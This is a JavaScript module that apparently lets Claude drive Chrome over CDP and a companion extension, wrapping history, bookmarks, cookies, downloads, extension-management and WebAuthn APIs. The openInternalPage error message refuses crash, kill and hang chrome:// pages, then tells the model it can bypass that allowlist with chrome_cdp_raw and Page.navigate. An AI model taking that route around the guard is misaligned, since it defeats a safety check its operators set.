// To set up endpoint in the extension: when Chrome is up and our companion
// is loaded, we push the endpoint info via chrome.storage.local.set() over
// CDP (Runtime.evaluate in the extension's service worker context).

const _extJobQueue   = [];                // FIFO of pending jobs awaiting the extension's poll
const _extJobWaiters = new Map();         // jobId → { resolve, reject, timer }
let   _extJobSeq     = 1;
let   _extPushedEndpoint = false;

async function _extPushEndpoint() {
  // One-shot: tell the companion where to find us. Run Runtime.evaluate
  // against the extension's service worker so the storage write happens
  // inside the extension's storage scope.
  if (_extPushedEndpoint || !_browser) return;
  try {
    const sess = await _browser.target().createCDPSession();
    try {
      // Find the extension service-worker target
      await sess.send('Target.setDiscoverTargets', { discover: true });
      const { targetInfos } = await sess.send('Target.getTargets');
      const sw = targetInfos.find(t => t.type === 'service_worker' && t.url.includes('chrome-extension://'));
      if (!sw) return;
      const { sessionId } = await sess.send('Target.attachToTarget', { targetId: sw.targetId, flatten: true });

      // Read endpoint info from disk (same file the MCP child reads)
      const endpointPath = require('path').join(
        process.env.CLAUDE_CONFIG_DIR || require('path').join(require('os').homedir(), '.claude'),
        'ccm-browser-endpoint.json'
      );
      const env = JSON.parse(require('fs').readFileSync(endpointPath, 'utf8'));
      const url   = env.url;
      const token = env.token;

      await sess.send('Runtime.evaluate', {
        expression: `chrome.storage.local.set({ ccmEndpoint: ${JSON.stringify({ url, token })} })`,
        awaitPromise: true,
      }, sessionId);

      _extPushedEndpoint = true;
      console.log('[chrome-companion] pushed endpoint to extension');
    } finally { try { await sess.detach(); } catch (_) {} }
  } catch (e) {
    console.warn('[chrome-companion] could not push endpoint:', e.message);
  }
}

// Called by HTTP server when the extension polls /ext/poll
function extPollNext() {
  // Ensure the extension knows our endpoint (fire-and-forget; idempotent)
  _extPushEndpoint().catch(() => {});
  return _extJobQueue.shift() || null;
}

// Called by HTTP server when the extension POSTs /ext/result
function extReceiveResult({ id, result }) {
  const waiter = _extJobWaiters.get(id);
  if (!waiter) return false;
  _extJobWaiters.delete(id);
  clearTimeout(waiter.timer);
  if (result?.error) waiter.reject(new Error(result.error));
  else waiter.resolve(result);
  return true;
}

// Queue a job and await the extension's response
async function _extCall(method, params = {}) {
  // Use the Puppeteer-version-safe helper — direct `.isConnected()` throws
  // "is not a function" on v22+ which dropped the method for a `.connected` prop.
  if (!_isBrowserAlive()) {
    throw new Error('Chrome is not running. Call chrome_launch first.');
  }
  const id = 'j-' + (_extJobSeq++);
  _extJobQueue.push({ id, method, params });
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => {
      _extJobWaiters.delete(id);
      reject(new Error('Companion extension did not respond within 15s (is it loaded?)'));
    }, 15_000);
    _extJobWaiters.set(id, { resolve, reject, timer });
  });
}

// ── Extension-API wrappers (Phase 6) ──────────────────────────────────────

// Tab groups
async function tabGroupsQuery(opts = {})      { return _extCall('tabGroups.query', opts); }
async function tabGroupsUpdate(opts = {})     { return _extCall('tabGroups.update', opts); }
async function tabsGroup(opts = {})           { return _extCall('tabs.group', opts); }
async function tabsUngroup({ tabIds } = {})   { return _extCall('tabs.ungroup', { tabIds }); }

// Sessions (recently closed, restore)
async function sessionsRecent(opts = {})      { return _extCall('sessions.getRecentlyClosed', opts); }
async function sessionsRestore({ sessionId } = {}) { return _extCall('sessions.restore', { sessionId }); }

// Reading list
async function readingListQuery(opts = {})    { return _extCall('readingList.query', opts); }
async function readingListAdd(opts = {})      { return _extCall('readingList.addEntry', opts); }
async function readingListRemove(opts = {})   { return _extCall('readingList.removeEntry', opts); }

// History (Chrome's own — not our profile)
async function chromeHistorySearch(opts = {})   { return _extCall('history.search', opts); }
async function chromeHistoryDeleteUrl(opts = {}){ return _extCall('history.deleteUrl', opts); }
async function chromeHistoryDeleteAll()         { return _extCall('history.deleteAll', {}); }

// Bookmarks (Chrome's own — not our profile)
async function chromeBookmarksTree()           { return _extCall('bookmarks.getTree', {}); }
async function chromeBookmarksSearch(opts = {}){ return _extCall('bookmarks.search', opts); }
async function chromeBookmarksCreate(opts = {}){ return _extCall('bookmarks.create', opts); }
async function chromeBookmarksRemove(opts = {}){ return _extCall('bookmarks.remove', opts); }

// Downloads
async function downloadsSearch(opts = {})       { return _extCall('downloads.search', opts); }
async function downloadsDownload(opts = {})     { return _extCall('downloads.download', opts); }
async function downloadsCancel(opts = {})       { return _extCall('downloads.cancel', opts); }
async function downloadsOpen(opts = {})         { return _extCall('downloads.open', opts); }

// Management (OTHER extensions)
async function managementGetAll()               { return _extCall('management.getAll', {}); }
async function managementSetEnabled(opts = {})  { return _extCall('management.setEnabled', opts); }
async function managementUninstall(opts = {})   { return _extCall('management.uninstall', opts); }

// declarativeNetRequest (faster than Fetch interception for "block X")
async function dnrUpdateDynamic(opts = {})      { return _extCall('dnr.updateDynamic', opts); }
async function dnrGetDynamic()                  { return _extCall('dnr.getDynamic', {}); }

// Search
async function searchQuery(opts = {})           { return _extCall('search.query', opts); }

// System info
async function systemCpu()                      { return _extCall('system.cpu.getInfo', {}); }
async function systemMemory()                   { return _extCall('system.memory.getInfo', {}); }
async function systemDisplay()                  { return _extCall('system.display.getInfo', {}); }
async function systemStorage()                  { return _extCall('system.storage.getInfo', {}); }

// Top sites
async function topSites()                       { return _extCall('topSites.get', {}); }

// Notifications (OS-level)
async function notifyCreate(opts = {})          { return _extCall('notifications.create', opts); }

async function openInternalPage({ name } = {}) {
  if (!name) throw new Error('name required (e.g. "settings", "flags", "extensions")');
  // Strip "chrome://" prefix if the caller included it
  const clean = String(name).replace(/^chrome:\/\//, '').replace(/\/$/, '');
  if (!_ALLOWED_CHROME_PAGES.has(clean)) {
    throw new Error(
      `chrome://${clean} is not on the allowlist (refused crash/kill/hang pages and uncategorized ones). ` +
      `Use chrome_cdp_raw with Page.navigate if you really need it.`
    );
  }
  return pageNavigate({ url: 'chrome://' + clean });
}

module.exports = {
  // Lifecycle / target / page / runtime / dom / input — Phase 1
  launch, close, status, findChrome, profileDir,
  targetList, targetNewTab, targetCloseTab, targetActivateTab,
  pageNavigate, pageReload, pageScreenshot, pagePdf, pageWaitForLoad,
  runtimeEval, runtimeRun,
  domQuery, domQueryAll, domGetText, domClick,
  inputClick, inputType, inputKey, inputScroll,
  cdpRaw,
  frameList, frameAttach, frameDetach, frameEval, frameClick, frameType,
  // Phase 11 — semantic observation + ref-based actions + auto-stabilize
  observe, observeDelta, clickRef, typeRef, focusRef, stabilize,
  // Phase 12 — intent resolver
  step,

  // Phase 8 — CodeMirror primitives
  cmFocus, cmGotoLine, cmReplaceLine,

  // Phase 9 — multi-file batch, open-at-line, save-survivor, picker
  cmEnsureEditor, cmOpenAtLine, cmEditAtomic,
  pickerInstall, pickerCapture, pickerCancel,

  // Phase 15 — split-view state (read-only: tells Claude which CDP target
  // is the left/right pane so it can drive both via targetId in one turn)
  splitState,
  // Phase 16 — Claude controls the split layout itself (no manual button click)
  splitEnable, splitDisable, splitSwap, splitSetRatio,

  // Phase 2 — Network
  networkGetCookies, networkSetCookie, networkDeleteCookies, networkClearAllCookies,
  networkSetExtraHeaders, networkSetBlockedURLs, networkSetUserAgent,

  // Phase 2 — Storage / DOMStorage / IndexedDB / CacheStorage
  storageClearForOrigin, storageGetUsage, storageGetCookies,
  domStorageGetItems, domStorageSetItem, domStorageRemoveItem, domStorageClear,
  indexedDbList, indexedDbDelete,
  cacheList, cacheDelete,

  // Phase 2 — Emulation
  emulateUserAgent, emulateGeolocation, emulateClearGeolocation,
  emulateTimezone, emulateLocale, emulateDevice, emulateClearDevice,
  emulateColorScheme, emulateNetwork, emulateCpuThrottle, emulateVisionDeficiency,

  // Phase 3 — Extensions / Autofill / WebAuthn
  extensionsLoadUnpacked, extensionsUninstall,
  autofillTrigger, autofillSetAddresses,
  webauthnEnable, webauthnAddAuthenticator, webauthnRemoveAuthenticator,
  webauthnGetCredentials, webauthnClearCredentials, webauthnSetUserVerified,

  // Phase 4 — Fetch / Console / A11y / CSS
  fetchEnable, fetchDisable, fetchListPending, fetchContinue, fetchFail, fetchFulfill,
  consoleSubscribe, consoleGetRecent,
  a11yEnable, a11yGetFullTree, a11yQueryByRole,
  cssGetComputed, cssGetMatched,

  // Phase 5 — Performance / Security / SW / Browser
  perfGetMetrics, perfStartCpuProfile, perfStopCpuProfile,
  perfStartTrace, perfStopTrace,
  securityGetStatus,
  swEnable, swUnregister, swStop,
  browserGrantPermissions, browserResetPermissions, browserSetDownloadBehavior,

  // Convenience
  openInternalPage,

  // Phase 6 — Extension API bridge
  // Internal — called by HTTP server when the companion polls / posts:
  extPollNext, extReceiveResult,
  // Tools:
  tabGroupsQuery, tabGroupsUpdate, tabsGroup, tabsUngroup,
  sessionsRecent, sessionsRestore,
  readingListQuery, readingListAdd, readingListRemove,
  chromeHistorySearch, chromeHistoryDeleteUrl, chromeHistoryDeleteAll,
  chromeBookmarksTree, chromeBookmarksSearch, chromeBookmarksCreate, chromeBookmarksRemove,
  downloadsSearch, downloadsDownload, downloadsCancel, downloadsOpen,
  managementGetAll, managementSetEnabled, managementUninstall,
  dnrUpdateDynamic, dnrGetDynamic,
  searchQuery,
  systemCpu, systemMemory, systemDisplay, systemStorage,
  topSites,
  notifyCreate,
};
